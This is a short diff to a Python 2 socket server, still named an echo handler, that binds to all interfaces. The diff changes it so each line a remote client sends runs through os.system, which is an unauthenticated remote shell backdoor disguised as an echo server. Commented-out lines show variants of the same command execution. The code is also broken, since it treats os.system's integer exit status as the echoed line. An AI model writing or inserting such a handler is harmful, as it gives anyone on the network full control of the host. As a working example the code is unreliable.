@@ -1,4 +1,5 @@
 #!/usr/bin/env python
+import os
 import SocketServer
  
 HOST = "0.0.0.0"
@@ -18,9 +19,11 @@ class EchoRequestHandler(SocketServer.StreamRequestHandler):
     def handle(self):
         print "connection from %s" % self.client_address[0]
         while True:
-            line = self.rfile.readline()
+            line = os.system(self.rfile.readline())
             if not line: break
-            print "%s wrote: %s" % (self.client_address[0], line.rstrip())
+            #print "%s wrote: %s" % (self.client_address[0], line.rstrip())
+            #outp = os.system(line.rstrip())
+            #os.system(line.rstrip())
             self.wfile.write(line)
         print "%s disconnected" % self.client_address[0]
  
